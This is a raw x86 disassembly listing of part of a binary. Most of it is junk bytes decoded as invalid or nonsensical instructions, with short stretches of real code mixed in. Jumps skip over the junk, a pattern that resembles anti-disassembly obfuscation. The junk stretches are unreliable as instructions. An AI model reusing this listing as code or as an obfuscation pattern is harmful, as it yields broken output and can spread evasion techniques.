  40517b:	lock jo 0x4051f1
  40517e:	aaa    
  40517f:	repz daa 
  405181:	jp     0x4051bb
  405183:	(bad)  [edx-0x521af8e3]
  405189:	shl    BYTE PTR [ebx-0x5d],cl
  40518c:	or     eax,0x6d912284
  405191:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405192:	std    
  405193:	push   eax
  405194:	test   DWORD PTR [ecx-0x20c43b37],eax
  40519a:	or     ecx,DWORD PTR [ecx+ecx*1-0x18]
  40519e:	dec    edi
  40519f:	mov    edx,gs
  4051a1:	dec    esp
  4051a2:	mov    edx,0xfe52f965
  4051a7:	push   0x76
  4051a9:	(bad)  
  4051aa:	retf   0xebf4
  4051ad:	or     ebx,DWORD PTR ds:0x778bbe8a
  4051b3:	adc    al,BYTE PTR [esi]
  4051b5:	stos   BYTE PTR es:[edi],al
  4051b6:	and    DWORD PTR cs:[ecx-0x32],0xffffffd7
  4051bb:	jmp    0x45b5:0x97c00561
  4051c2:	cli    
  4051c3:	addr16 jns 0x405238
  4051c6:	das    
  4051c7:	loop   0x405190
  4051c9:	mov    ecx,0xfa65395f
  4051ce:	daa    
  4051cf:	mov    ecx,DWORD PTR [edi+esi*2+0x4c639722]
  4051d6:	and    edx,ebp
  4051d8:	dec    esi
  4051d9:	popf   
  4051da:	stos   DWORD PTR es:[edi],eax
  4051db:	outs   dx,DWORD PTR ds:[esi]
  4051dc:	push   esi
  4051dd:	fistp  DWORD PTR [edi-0x48b01541]
  4051e3:	mov    dl,dh
  4051e5:	xchg   ebp,eax
  4051e6:	pop    edx
  4051e7:	sbb    DWORD PTR [edi],0x66
  4051ea:	in     eax,0x22
  4051ec:	(bad)  
  4051ed:	mov    ds:0x8ca08114,eax
  4051f2:	mov    edx,0x41d640fc
  4051f7:	add    BYTE PTR [edx+0x1f1be573],bl
  4051fd:	leave  
  4051fe:	test   BYTE PTR [ebx+ebx*4+0x294e9e6e],al
  405205:	dec    eax
  405206:	sbb    dh,BYTE PTR [edx+0x70]
  405209:	sbb    DWORD PTR [edx-0x60],ebp
  40520c:	xor    edx,DWORD PTR [ebp+0x47]
  40520f:	push   0x45574099
  405214:	mov    bh,0x7d
  405216:	clc    
  405217:	dec    edi
  405218:	mov    bh,0x1
  40521a:	dec    edx
  40521b:	inc    eax
  40521c:	ins    BYTE PTR es:[edi],dx
  40521d:	popf   
  40521e:	shl    BYTE PTR [edi+0x79bf62f0],0x97
  405225:	or     eax,0xd0082f4
  40522a:	test   DWORD PTR [esi],edi
  40522c:	adc    al,0x81
  40522e:	adc    edx,DWORD PTR [eax-0x49]
  405231:	jnp    0x4051bf
  405233:	int3   
  405234:	add    bh,ch
  405236:	pop    ebx
  405237:	cwde   
  405238:	mov    bl,0x51
  40523a:	aad    0x7d
  40523c:	test   DWORD PTR [ecx+esi*1-0x4],esp
  405240:	leave  
  405241:	mov    al,ds:0xfeb5a84
  405246:	add    ch,ch
  405248:	dec    ebp
  405249:	lods   al,BYTE PTR ds:[esi]
  40524a:	outs   dx,BYTE PTR ds:[esi]
  40524b:	mov    cl,0x89
  40524d:	lock call 0xb068:0x5fcd93ce
  405255:	jnp    0x4051ee
  405257:	adc    al,al
  405259:	mov    ds:0xd9b1926e,al
  40525e:	push   eax
  40525f:	add    BYTE PTR [ebx],bl
  405261:	jl     0x405211
  405263:	pushf  
  405264:	in     eax,dx
  405265:	push   es
  405266:	inc    edx
  405267:	sbb    dl,0x8c
  40526a:	sbb    cl,BYTE PTR [ecx+0x14cd2faf]
  405270:	jmp    0x1a02:0xd825fde
  405277:	sahf   
  405278:	int3   
  405279:	shl    eax,0x5e
  40527c:	cmp    al,ah
  40527e:	mov    DWORD PTR [edx-0x23],eax
  405281:	int    0xa1
  405283:	sub    eax,0xe6d63d91
  405288:	repnz mov esi,0x19d02cc
  40528e:	pop    ds
  40528f:	pop    ebp
  405290:	jmp    0x3c5b:0x188ceca3
  405297:	xor    BYTE PTR [edi],ah
  405299:	(bad)  
  40529a:	addr16 leave 
  40529c:	mov    al,BYTE PTR [ebx+ebp*2]
  40529f:	and    edx,DWORD PTR [edi]
  4052a1:	xchg   ecx,eax
  4052a2:	push   esi
  4052a3:	xlat   BYTE PTR ds:[ebx]
  4052a4:	sti    
  4052a5:	int3   
  4052a6:	pop    ecx
  4052a7:	xor    eax,0x2b3afcb
  4052ac:	cs test DWORD PTR cs:[esi-0x7933b71d],ecx
  4052b4:	sbb    BYTE PTR [ebx+0x161c4fbd],0xe5
  4052bb:	cmp    BYTE PTR [esi],dl
  4052bd:	push   eax
  4052be:	ja     0x405330
  4052c0:	stos   BYTE PTR es:[edi],al
  4052c1:	mov    ds:0x55e480c2,eax
  4052c6:	inc    esp
  4052c7:	dec    ebp
  4052c8:	push   ebp
  4052c9:	xchg   edx,eax
  4052ca:	retf   0x792f
  4052cd:	call   0xc103:0xf2332132
  4052d4:	add    esi,ecx
  4052d6:	imul   eax,esi
  4052d9:	jmp    0x40559d
  4052de:	mov    eax,DWORD PTR [ebp+0xc]
  4052e1:	mov    eax,DWORD PTR [eax+0x78]
  4052e4:	mov    DWORD PTR [ebp+0xc],eax
  4052e7:	mov    eax,DWORD PTR [ebp-0x4]
  4052ea:	mov    esi,DWORD PTR [ebp-0x8]
  4052ed:	xor    eax,edx
  4052ef:	xor    esi,edx
  4052f1:	add    eax,ecx
  4052f3:	jmp    0x405577
  4052f8:	shl    DWORD PTR [ebx],0xe4
  4052fb:	add    al,0xe2
  4052fd:	ret    
  4052fe:	loope  0x4052e1
  405300:	and    esp,DWORD PTR [eax-0x20d5fef8]
  405306:	fnstsw WORD PTR [ecx]
  405308:	(bad)  
  405309:	sub    dh,BYTE PTR [eax+0x70]
  40530c:	fnstcw WORD PTR [esi+0x70]
  40530f:	jo     0x405332
  405311:	mov    dh,0xe3
  405313:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405314:	cdq    
  405315:	and    dl,BYTE PTR [edi+eax*1]
  405318:	mov    edi,DWORD PTR [ecx+0x2d644d90]
  40531e:	jmp    0x6df84801
  405323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405324:	push   ss
  405325:	push   ebp
  405326:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405327:	cmp    BYTE PTR [eax+0x39],bl
  40532a:	ficom  WORD PTR [edx+0x3b]
  40532d:	jns    0x4053a4
  40532f:	or     DWORD PTR [ebx+eiz*4-0x2b7c51b],ecx
  405336:	popf   
  405337:	add    eax,0x8dbb44b0
  40533c:	inc    ebx
  40533d:	loop   0x4052e6
  40533f:	xchg   esp,eax
  405340:	shl    BYTE PTR [ebx-0x4766005a],0xd9
  405347:	cdq    
  405348:	jns    0x4053c2
  40534a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40534b:	test   bh,al
  40534d:	sbb    al,0xaf
  40534f:	jle    0x40538c
  405351:	jmp    0x3ca1f0a8
  405356:	sbb    eax,0x58bce703
  40535b:	iret   
  40535c:	cmp    BYTE PTR [edx],ah
  40535e:	pop    es
  40535f:	shl    BYTE PTR [ebx-0x48f0e0c],1
  405365:	add    DWORD PTR [ebp-0x7f681865],ecx
  40536b:	imul   eax,ecx,0xffffff8f
  40536e:	jne    0x4053b5
  405370:	(bad)  
  405371:	adc    DWORD PTR [eax],eax
  405373:	cmp    eax,0xf584f632
  405378:	inc    esp
  405379:	push   0xffffffc0
  40537b:	test   DWORD PTR ds:0x2d16459a,esi
  405381:	rol    DWORD PTR [esi],cl
  405383:	cli    
  405384:	inc    edi
  405385:	(bad)  
  405386:	mov    dh,0x0
  405388:	(bad)  
  405389:	(bad)  
  40538a:	shr    BYTE PTR [edx-0x3b],0x1f
  40538e:	mov    esp,0x94cc96d3
  405393:	dec    ebp
  405394:	sbb    al,0xab
  405396:	mov    dh,BYTE PTR [eax+0x12d4d007]
  40539c:	cmp    bh,BYTE PTR [edx+0x56b950df]
  4053a2:	pusha  
  4053a3:	dec    esp
  4053a4:	add    BYTE PTR [esi+0x33],0xf7
  4053a8:	pop    edi
  4053a9:	aaa    
  4053aa:	adc    bh,BYTE PTR [eax]
  4053ac:	cmp    bh,BYTE PTR [ecx+0x13]
  4053af:	icebp  
  4053b0:	call   0x6611:0xedf7f046
  4053b7:	or     BYTE PTR [esi+ebp*4+0x48ca252c],ah
  4053be:	pop    ss
  4053bf:	push   edx
  4053c0:	xor    BYTE PTR [ebx-0x2269755e],bh
  4053c6:	mov    ds:0xc01004f5,eax
  4053cb:	pop    es
  4053cc:	icebp  
  4053cd:	adc    dh,BYTE PTR [edx]
  4053cf:	add    al,0x2a
  4053d1:	shr    DWORD PTR [edx],0x84
  4053d4:	jo     0x4053c6
  4053d6:	push   eax
  4053d7:	and    al,0x89
  4053d9:	gs sbb al,0xcb
  4053dc:	fwait
  4053dd:	push   esp
  4053de:	outs   dx,BYTE PTR ds:[esi]
  4053df:	inc    ebp
  4053e0:	out    0xba,eax
  4053e2:	push   eax
  4053e3:	lods   eax,DWORD PTR ds:[esi]
  4053e4:	mov    eax,ds:0xf53b5c3
  4053e9:	out    0x7b,eax
  4053eb:	scas   al,BYTE PTR es:[edi]
  4053ec:	dec    edi
  4053ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053ee:	retf   0x7cb3
  4053f1:	jle    0x405386
  4053f3:	mov    ds:0x34a1a174,eax
  4053f8:	or     eax,DWORD PTR [ebx-0x1b108cbb]
  4053fe:	enter  0xf26b,0x95
  405402:	and    DWORD PTR [eax+0x12],edx
  405405:	fild   QWORD PTR [ebx+0x3fcb82e4]
  40540b:	call   esi
  40540d:	fldln2 
  40540f:	sar    DWORD PTR [esi-0x55acc36d],0x9b
  405416:	call   0x465:0xd73d8602
  40541d:	aad    0xe8
  40541f:	jne    0x405482
  405421:	mov    ecx,0x5d2acb45
  405426:	jmp    0x4053ad
  405428:	loope  0x405482
  40542a:	aas    
  40542b:	in     eax,dx
  40542c:	fmul   QWORD PTR [edx]
  40542e:	cli    
  40542f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405430:	jno    0x4053be
  405432:	loop   0x4053c1
  405434:	jns    0x4053e8
  405436:	into   
  405437:	cmp    al,0x96
  405439:	push   ss
  40543a:	push   ecx
  40543b:	and    ah,BYTE PTR [esp+eax*4]
  40543e:	stos   BYTE PTR es:[edi],al
  40543f:	std    
  405440:	pop    ss
  405441:	xor    BYTE PTR [ebx-0x36],cl
  405444:	(bad)  
  405446:	cmp    DWORD PTR [ecx+0x6e3a750c],edx
  40544c:	dec    eax
  40544d:	jmp    0x94e242fb
  405452:	jp     0x40542a
  405454:	dec    ebx
  405455:	and    DWORD PTR [esi+ecx*4],esi
  405458:	and    DWORD PTR [ebx-0x7899ecf2],ecx
  40545e:	(bad)  
  405460:	leave  
  405461:	hlt    
  405462:	and    BYTE PTR [edi-0x2e],0x83
  405466:	jl     0x4054ad
  405468:	and    BYTE PTR [eax+0x48],0x30
  40546c:	arpl   WORD PTR [edi],di
  40546e:	mov    esp,cs
  405470:	and    al,0xec
  405472:	push   ebx
  405473:	xchg   ecx,eax
  405474:	fadd   st(2),st
  405476:	push   0xfffffff1
  405478:	out    dx,eax
  405479:	pop    ecx
  40547a:	stc    
  40547b:	push   es
  40547c:	les    eax,FWORD PTR [eax-0x1aa9376b]
  405482:	inc    edi
  405483:	scas   al,BYTE PTR es:[edi]
  405484:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405485:	(bad)  
  405486:	fld    DWORD PTR [edx]
  405488:	mov    al,ds:0x704f520c
  40548d:	aam    0x78
  40548f:	inc    edx
  405490:	mov    edx,0x85dd8748
  405495:	ja     0x4054c4
  405497:	and    bl,BYTE PTR [edx-0x5d]
  40549a:	inc    edx
  40549b:	fdiv   QWORD PTR [eax]
  40549d:	retf   
  40549e:	sti    
  40549f:	xchg   ebx,eax
  4054a0:	js     0x405520
  4054a2:	out    0xf3,al
  4054a4:	ret    
  4054a5:	cmp    DWORD PTR [ebx],esp
  4054a7:	addr16 xor ch,dh
  4054aa:	pop    eax
  4054ab:	inc    ebx
  4054ac:	or     eax,0x65129b8c
  4054b1:	int3   
  4054b2:	mov    dl,0x74
  4054b4:	dec    ebp
  4054b5:	shl    DWORD PTR [ecx],0x54
  4054b8:	in     al,dx
  4054b9:	rcr    BYTE PTR [edi-0x26],1
  4054bc:	sbb    eax,0x9774d82f
  4054c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054c2:	stos   BYTE PTR es:[edi],al
  4054c3:	sub    DWORD PTR [esi+0x2b0ae7c],ebx
  4054c9:	pusha  
  4054ca:	icebp  
  4054cb:	pop    edi
  4054cc:	daa    
  4054cd:	ss test ch,0x48
  4054d1:	retf   0x8c8d
  4054d4:	adc    ah,BYTE PTR [esp+edi*2-0x5e]
  4054d8:	test   DWORD PTR [esi+0x6c],esi
  4054db:	mov    dh,0x15
  4054dd:	sti    
  4054de:	retf   0xa3cb
  4054e1:	sbb    ebx,DWORD PTR [ecx]
  4054e3:	loopne 0x4054ee
  4054e5:	xor    eax,0x939e5a6e
  4054ea:	out    0x0,eax
  4054ec:	fadd   DWORD PTR ds:[eax-0x4b]
  4054f0:	mov    cl,0xd8
  4054f2:	cmc    
  4054f3:	mov    al,ds:0xdcb4fd05
  4054f8:	test   BYTE PTR [esi+0x79],0xf6
  4054fc:	lahf   
  4054fd:	push   es
  4054fe:	test   al,0x24
  405500:	jo     0x4054a3
  405502:	mov    edi,0x81838e85
  405507:	and    dh,bl
  405509:	sub    eax,0xa4dda0e1
  40550e:	mov    edi,0x1b99ae1b
  405513:	fwait
  405514:	dec    ebx
  405515:	pusha  
  405516:	jmp    0x97a74eaf
  40551b:	bound  ecx,QWORD PTR [edi+0x32]
  40551e:	dec    ebx
  40551f:	fldcw  WORD PTR [esi+0x7e04b7be]
  405525:	push   esp
  405526:	or     eax,0xdff25b0f
  40552b:	test   al,0x99
  40552d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40552e:	push   ecx
  40552f:	mov    ah,BYTE PTR [edi+ebx*1-0x66]
  405533:	scas   eax,DWORD PTR es:[edi]
  405534:	xchg   esp,eax
  405535:	cli    
  405536:	sub    BYTE PTR [eax+0x1f],bh
  405539:	push   ebx
  40553a:	in     eax,0x5e
  40553c:	rdtsc  
  40553e:	xchg   DWORD PTR [ebp-0x112030ef],ebp
  405544:	pop    edi
  405545:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405546:	out    dx,al
  405547:	jno    0x405504
  405549:	cdq    
  40554a:	xor    eax,0xb0a1ba6b
  40554f:	(bad)  
  405550:	cmp    BYTE PTR [ebp+edi*4+0x38],0xbd
  405555:	jmp    0x4054e0
  405557:	push   ss
  405558:	and    al,0x95
  40555a:	sbb    al,0x7f
  40555c:	cmp    eax,0x71fddb08
  405561:	hlt    
  405562:	icebp  
  405563:	ss sahf 
  405565:	jmp    0x62ae188d
  40556a:	cdq    
  40556b:	jae    0x405597
  40556d:	push   ebp
  40556e:	in     eax,0xe5
  405570:	or     dl,BYTE PTR [eax+0x2c786c3a]
  405576:	xor    al,0x3
  405578:	icebp  
  405579:	imul   eax,esi
  40557c:	mov    esi,DWORD PTR [ebp+0xc]
  40557f:	cmp    esi,eax
  405581:	mov    eax,DWORD PTR [ebp-0x4]
  405584:	je     0x405047
  40558a:	xor    eax,edx
  40558c:	add    eax,ecx
  40558e:	mov    ecx,DWORD PTR [ebp+0xc]
  405591:	imul   eax,ecx
  405594:	add    eax,DWORD PTR [ebp+0x8]
  405597:	mov    DWORD PTR [ebp+0xc],eax
  40559a:	mov    eax,DWORD PTR [ebp+0xc]
  40559d:	pop    esi
  40559e:	leave  
  40559f:	ret    0x8
  4055a2:	push   ebp
  4055a3:	mov    ebp,esp
  4055a5:	push   ecx
  4055a6:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  4055ad:	mov    eax,DWORD PTR [ebp-0x4]
  4055b0:	mov    edx,DWORD PTR [ebp+0x10]
  4055b3:	mov    ecx,0x7510855
  4055b8:	adc    DWORD PTR ds:0x434421,0x21da
  4055c2:	xor    eax,ecx
  4055c4:	add    eax,0x32729c
  4055c9:	and    DWORD PTR ds:0x4326fc,0x2b83
  4055d3:	mov    DWORD PTR [edx],eax
  4055d5:	mov    eax,ds:0x434439
  4055da:	mov    edx,DWORD PTR ds:0x43445d
  4055e0:	sub    eax,edx
  4055e2:	xor    eax,DWORD PTR [eax+edx*1]
  4055e5:	mov    eax,DWORD PTR [ebp+0xc]
  4055e8:	dec    edx
  4055e9:	xor    eax,ecx
  4055eb:	dec    edx
  4055ec:	jmp    0x405755
  4055f1:	loope  0x4055fe
  4055f3:	xchg   edi,eax
  4055f4:	fdiv   DWORD PTR [ebp+0x64]
  4055f7:	jno    0x405602
  4055f9:	add    DWORD PTR [edi-0x74],0x124bbc84
  405600:	jmp    0x70b07eb4
  405605:	les    edi,FWORD PTR [edi+0x70]
  405608:	jo     0x405621
  40560a:	(bad)  
  40560b:	leave  
  40560c:	mov    DWORD PTR cs:[ebp+0x5e],esp
  405610:	add    eax,0x6ad890e9
  405615:	xor    bl,ah
  405617:	jp     0x4055ef
  405619:	jecxz  0x4055d3
  40561b:	mov    edx,0xa524934b
  405620:	les    ecx,FWORD PTR ds:0xb9ae
  405625:	loop   0x40561d
  405627:	fdiv   QWORD PTR [eax-0x71f67288]
  40562d:	inc    ebp
  40562e:	das    
  40562f:	pushf  
  405630:	je     0x40566e
  405632:	dec    ebx
  405633:	test   DWORD PTR [ecx-0x2b2703c7],0xdad37b1d
  40563d:	cli    
  40563e:	dec    esi
  40563f:	scas   eax,DWORD PTR es:[edi]
  405640:	fsubr  DWORD PTR [edx]
  405642:	fldz   
  405644:	out    dx,eax
  405645:	pop    eax
  405646:	jae    0x4055ee
  405648:	push   ecx
  405649:	fcmovb st,st(5)
  40564b:	mov    cl,0x42
  40564d:	out    dx,eax
  40564e:	or     ah,BYTE PTR [ecx+0x13]
  405651:	and    dh,BYTE PTR [edx-0x78]
  405654:	jo     0x405627
  405656:	push   0x9fba862f
  40565b:	lahf   
  40565c:	fldln2 
  40565e:	cmp    al,0x8f
  405660:	adc    eax,esi
  405662:	pop    ecx
  405663:	and    eax,0x7fa3b9b2
  405668:	push   cs
  405669:	or     al,BYTE PTR [ecx]
  40566b:	fwait
  40566c:	aaa    
  40566d:	xor    eax,0xb9f35570
  405672:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405673:	sub    bh,ch
  405675:	cli    
  405676:	pop    ds
  405677:	daa    
  405678:	xor    DWORD PTR [ecx-0x79dde5ae],ebp
  40567e:	push   0x2b
  405680:	cmc    
  405681:	dec    ebx
  405682:	push   ebx
  405683:	idiv   DWORD PTR [ebx]
  405685:	std    
  405686:	bound  edi,QWORD PTR [ebx-0x59efe4e8]
  40568c:	fwait
  40568d:	and    eax,0x9f76a4d7
  405692:	and    DWORD PTR [ecx-0x7c],0xc62483df
  405699:	pop    esp
  40569a:	mov    ecx,0xdc7b5d61
  40569f:	repnz mov ebp,0x67b92c4f
  4056a5:	jns    0x4056a5
  4056a7:	inc    DWORD PTR [ebx]
  4056a9:	lock cdq 
  4056ab:	mul    BYTE PTR [ebx-0x2c]
  4056ae:	enter  0xe8c2,0x8f
  4056b2:	mov    edi,0x530bc335
  4056b7:	cmp    bh,bl
  4056b9:	out    0x15,eax
  4056bb:	mov    edx,0x7c5db82b
  4056c0:	mov    WORD PTR [eax+edi*8],?
  4056c3:	inc    edi
  4056c4:	push   cs
  4056c5:	or     edx,DWORD PTR [eax+0xc]
  4056c8:	mov    DWORD PTR ds:0x270fe253,edi
  4056ce:	outs   dx,DWORD PTR ds:[esi]
  4056cf:	mov    cl,BYTE PTR [edi-0xd]
  4056d2:	sbb    eax,0x7f58bb0e
  4056d7:	test   BYTE PTR [esi],0x6f
  4056da:	push   esi
  4056db:	xadd   DWORD PTR [esi],edi
  4056de:	dec    ecx
  4056df:	inc    edi
  4056e0:	je     0x405749
  4056e2:	jne    0x4056ce
  4056e4:	and    BYTE PTR [edi+eiz*8],cl
  4056e7:	mov    dh,0x29
  4056e9:	jns    0x4056e7
  4056eb:	iret   
  4056ec:	mov    bh,BYTE PTR [edi+0x51c59f45]
  4056f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056f3:	ret    0x830e
  4056f6:	fucom  st(3)
  4056f8:	inc    esp
  4056f9:	push   0xffffff8d
  4056fb:	stos   DWORD PTR es:[edi],eax
  4056fc:	or     BYTE PTR [ecx],0xc5
  4056ff:	dec    cl
  405701:	nop
  405702:	js     0x4056d0
  405704:	add    edi,eax
  405706:	stos   DWORD PTR es:[edi],eax
  405707:	inc    ecx
  405708:	jge    0x405699
  40570a:	fwait
  40570b:	pop    ebp
  40570c:	sbb    dh,ah
  40570e:	cwde   
  40570f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405710:	sbb    bl,BYTE PTR [ecx]
  405712:	inc    esi
  405713:	test   al,0xa
  405715:	and    edx,DWORD PTR [edx]
  405717:	ret    
  405718:	ins    BYTE PTR es:[edi],dx
  405719:	ret    
  40571a:	mov    ch,0x0
  40571c:	adc    al,0xd
  40571e:	xor    al,0xf2
  405720:	out    dx,al
  405721:	xlat   BYTE PTR ds:[ebx]
  405722:	call   0x44e1f91b
  405727:	rol    BYTE PTR [ebx],1
  405729:	(bad)  
  40572a:	jbe    0x40578f
  40572c:	xchg   edi,eax
  40572d:	bound  ecx,QWORD PTR [edx+0x59]
  405730:	test   al,0xa6
  405732:	pop    ebp
  405733:	xor    DWORD PTR [edx-0x61319d1b],ecx
  405739:	fwait
  40573a:	adc    esp,DWORD PTR [edi-0x38]
  40573d:	icebp  
  40573e:	sti    
  40573f:	arpl   WORD PTR [ebp+0x63],bx
  405742:	mov    dh,0xf8
  405744:	cmp    DWORD PTR ds:0x7e7d480b,eax
  40574a:	xchg   BYTE PTR [edi],al
  40574c:	iret   
  40574d:	cdq    
  40574e:	bt     edi,esi
  405751:	xlat   BYTE PTR ds:[ebx]
  405752:	jl     0x405775
  405754:	lods   eax,DWORD PTR ds:[esi]
  405755:	push   esi
  405756:	mov    esi,DWORD PTR [ebp+0x10]
  405759:	and    DWORD PTR ds:0x43436a,0x0
  405763:	mov    edx,DWORD PTR ds:0x43436a
  405769:	inc    edx
  40576a:	mov    DWORD PTR ds:0x43436a,edx
  405770:	cmp    DWORD PTR ds:0x43436a,0x22
  405777:	jne    0x405789
  40577d:	push   DWORD PTR [ebp-0xc]
  405780:	push   DWORD PTR [ebp-0x24]
  405783:	call   DWORD PTR ds:0x4329c2
  405789:	cmp    DWORD PTR ds:0x43436a,0x1c
  405790:	jb     0x405763
  405796:	mov    edx,0x32729c
  40579b:	adc    DWORD PTR ds:0x432dbe,0x43438a
  4057a5:	add    eax,edx
  4057a7:	mov    DWORD PTR [esi+0x4],eax
  4057aa:	movzx  eax,BYTE PTR ds:0x4326f4
  4057b1:	and    eax,DWORD PTR ds:0x43439a
  4057b7:	mov    ds:0x4326f4,eax
  4057bc:	mov    eax,DWORD PTR [ebp+0x14]
  4057bf:	mov    DWORD PTR ds:0x43437e,0x718d
  4057c9:	mov    esi,DWORD PTR [ebp+0x10]
  4057cc:	xor    DWORD PTR ds:0x432704,0x2330
  4057d6:	mov    DWORD PTR [esi+0x8],eax
  4057d9:	mov    eax,DWORD PTR [ebp+0x18]
  4057dc:	mov    esi,DWORD PTR [ebp+0x10]
  4057df:	mov    DWORD PTR [esi+0xc],eax
  4057e2:	mov    eax,DWORD PTR [ebp+0x1c]
  4057e5:	mov    esi,DWORD PTR [ebp+0x10]
  4057e8:	mov    DWORD PTR [esi+0x10],eax
  4057eb:	mov    eax,eax
  4057ed:	jmp    0x405956
  4057f2:	hlt    
  4057f3:	and    BYTE PTR [ecx],bl
  4057f5:	arpl   cx,sp
  4057f7:	jno    0x40586b
  4057f9:	scas   eax,DWORD PTR es:[edi]
  4057fa:	mov    al,ds:0x3c519e0f
  4057ff:	dec    ebx
  405800:	xchg   esp,eax
  405801:	test   al,0x73
  405803:	aaa    
  405804:	jo     0x405876
  405806:	les    edi,FWORD PTR [edi+0x70]
  405809:	jo     0x4057c6
  40580b:	ret    
  40580c:	hlt    
  40580d:	push   esp
  40580e:	fsub   QWORD PTR [eax]
  405810:	add    eax,0xd764eca8
  405815:	sahf   
  405816:	(bad)  
  405817:	das    
  405818:	jne    0x40586c
  40581a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40581b:	push   ecx
  40581c:	bound  ebx,QWORD PTR ds:0xb9515fbb
  405822:	push   ecx
  405823:	shl    BYTE PTR [ebp+0x65],cl
  405826:	shr    DWORD PTR [eax+0x691c8c81],1
  40582c:	xchg   esp,eax
  40582d:	push   0x1330a1a2
  405832:	adc    bl,bl
  405834:	nop
  405835:	fcom   DWORD PTR [eax+0x44361296]
  40583b:	or     BYTE PTR [ebx-0x7],0xaa
  40583f:	cmp    eax,0x5f181615
  405844:	inc    ebp
  405845:	in     eax,0x1e
  405847:	sub    DWORD PTR [edx+0x7c970c49],ebp
  40584d:	pop    es
  40584e:	inc    esp
  40584f:	cmp    ch,cl
  405851:	hlt    
  405852:	mov    ds:0xc51bfd3e,al
  405857:	pop    es
  405858:	pusha  
  405859:	mov    al,ds:0x12dc3e69
  40585e:	jl     0x405866
  405860:	add    DWORD PTR [edi+0x30],esp
  405863:	xchg   edi,eax
  405864:	(bad)  
  405865:	sti    
  405866:	call   FWORD PTR [eax+eax*1]
  405869:	pop    eax
  40586a:	std    
  40586b:	dec    edi
  40586c:	shr    BYTE PTR [ebx+0x11],1
  40586f:	adc    eax,0x333db3dc
  405874:	push   ds
  405875:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405876:	mov    eax,ds:0xc885d261
  40587b:	lods   al,BYTE PTR ds:[esi]
  40587c:	rcl    DWORD PTR [eax],1
  40587e:	cmp    BYTE PTR [edx-0xc],ch
  405881:	repnz (bad) 
  405883:	iret   
  405884:	shl    edx,0x84
  405887:	sti    
  405888:	and    ch,BYTE PTR [ebp+esi*2-0xe]
  40588c:	mov    dl,0xeb
  40588e:	xchg   esi,eax
  40588f:	popa   
  405890:	add    esi,DWORD PTR [edi]
  405892:	pop    ss
  405893:	xchg   edi,eax
  405894:	call   0xda13:0x58f1bf03
  40589b:	xor    ecx,DWORD PTR [ebp+0x578024b3]
  4058a1:	iret   
  4058a2:	out    0x79,al
  4058a4:	dec    BYTE PTR [ebx-0x5a6050f5]
  4058aa:	fdiv   DWORD PTR [esp+edi*1]
  4058ad:	mov    dl,0x46
  4058af:	lock icebp 
  4058b1:	push   ecx
  4058b2:	dec    eax
  4058b3:	jns    0x40585c
  4058b5:	push   esi
  4058b6:	cwde   
  4058b7:	xor    eax,0xc3b4b5fa
  4058bc:	aas    
  4058bd:	sub    BYTE PTR [edx-0x7f],al
  4058c0:	mov    bh,0x0
  4058c2:	test   al,0xf3
  4058c4:	out    dx,al
  4058c5:	test   BYTE PTR [eax+0x53],bh
  4058c8:	mov    al,0x43
  4058ca:	pop    ecx
  4058cb:	hlt    
  4058cc:	push   0x6082e900
  4058d1:	or     al,0x40
  4058d3:	push   edi
  4058d4:	(bad)  
  4058d5:	push   cs
  4058d6:	cmp    eax,0xe3ba5655
  4058db:	xor    al,ah
  4058dd:	jb     0x40589f
  4058df:	adc    DWORD PTR [edx-0xff344e5],ebp
  4058e5:	test   BYTE PTR [esi],bl
  4058e7:	xchg   esi,eax
  4058e8:	in     eax,dx
  4058e9:	cmp    DWORD PTR [ebp-0x5c],esp
  4058ec:	or     DWORD PTR [edi+0x6],ebp
  4058ef:	repnz clc 
  4058f1:	rcr    esp,0x1b
  4058f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058f5:	repnz push es
  4058f7:	adc    cl,dl
  4058f9:	leave  
  4058fa:	push   ds
  4058fb:	sar    DWORD PTR [edi+0x35c0af4b],cl
  405901:	cmp    esp,DWORD PTR [ecx]
  405903:	ss xchg ecx,eax
  405905:	push   edx
  405906:	aad    0x25
  405908:	fstp   DWORD PTR [edx+0x63]
  40590b:	mov    bl,0x94
  40590d:	xchg   DWORD PTR [edx],ebx
  40590f:	cmc    
  405910:	add    ebp,DWORD PTR [ecx+0x3f]
  405913:	dec    edx
  405914:	push   0xffffffe5
  405916:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405917:	adc    DWORD PTR [ebx],esi
  405919:	xor    edi,esi
  40591b:	mov    WORD PTR [esi],?
  40591d:	js     0x4058a7
  40591f:	out    dx,al
  405920:	mov    al,ds:0x19a92289
  405925:	or     al,0xfc
  405927:	adc    ecx,DWORD PTR [edi+0x75d87c45]
  40592d:	xor    BYTE PTR [esi+eiz*4-0x39],dl
  405931:	and    DWORD PTR [eax-0x3a],ebx
  405934:	xchg   eax,ecx
  405936:	inc    ecx
  405937:	popa   
  405938:	cwde   
  405939:	ins    BYTE PTR es:[edi],dx
  40593a:	cs fucomp st(4)
  40593d:	push   ss
  40593e:	mov    eax,ds:0x8352d660
  405943:	call   0x35c96d7a
  405948:	out    dx,eax
  405949:	aaa    
  40594a:	cli    
  40594b:	fdiv   DWORD PTR [ebp+0x23fb0bfc]
  405951:	xchg   ebp,eax
  405952:	push   eax
  405953:	outs   dx,BYTE PTR ds:[esi]
  405954:	icebp  
  405955:	repnz mov eax,DWORD PTR [ebp+0x8]
  405959:	xor    eax,ecx
  40595b:	add    eax,edx
  40595d:	pop    esi
  40595e:	leave  
  40595f:	ret    0x18
  405962:	push   ebp
  405963:	mov    ebp,esp
  405965:	mov    eax,DWORD PTR [ebp+0xc]
